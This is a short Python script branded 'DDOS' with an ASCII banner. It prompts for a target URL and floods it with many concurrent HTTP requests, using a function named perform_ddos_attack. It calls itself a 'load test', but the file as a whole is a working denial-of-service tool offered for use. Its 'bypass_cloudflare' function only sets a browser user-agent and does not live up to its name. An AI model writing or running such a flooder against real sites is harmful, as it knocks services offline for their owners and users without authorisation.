import aiohttp
import asyncio
import time
import os

auth = """
 ▄▀▀█▄▄   ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄ 
█ ▄▀   █ █ ▄▀   █ █      █ █ █   ▐ 
▐ █    █ ▐ █    █ █      █    ▀▄   
  █    █   █    █ ▀▄    ▄▀ ▀▄   █  
 ▄▀▄▄▄▄▀  ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀   
█     ▐  █     ▐            ▐      
▐        ▐                        
"""

async def bypass_cloudflare(session, target_url):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36'
    }
    async with session.get(target_url, headers=headers) as response:
        return response.status

async def worker(target_url, session, queue):
    while not queue.empty():
        _ = await queue.get()
        try:
            status = await bypass_cloudflare(session, target_url)
            print(f"\033[32m[+] Request successful: {status}")
        except Exception:
            print(f"\033[31m[-] Request failed")

async def perform_ddos_attack(target_url, num_requests, num_threads):
    queue = asyncio.Queue()
    for _ in range(num_requests):
        queue.put_nowait(1)

    conn = aiohttp.TCPConnector(limit=0)
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        tasks = [asyncio.create_task(worker(target_url, session, queue)) for _ in range(num_threads)]
        await asyncio.gather(*tasks)

async def main():
    os.system("cls||clear")
    while True:
        print(auth)
        target_url = input("\033[32mEnter the target URL: \x1b[0m").strip()
        num_threads = int(input("\033[32mThreads per second: \x1b[0m").strip())
        num_requests = int(input("\033[32mTotal number of requests: \x1b[0m").strip())

        print("\n\x1b[34mStarting load test...\x1b[0m")
        start_time = time.time()
        await perform_ddos_attack(target_url, num_requests, num_threads)
        duration = time.time() - start_time

        print(f"\n\x1b[32mTest completed in {duration:.2f} seconds.\x1b[0m")
        print("\n\x1b[31mRestarting in 5 seconds...\x1b[0m")
        await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
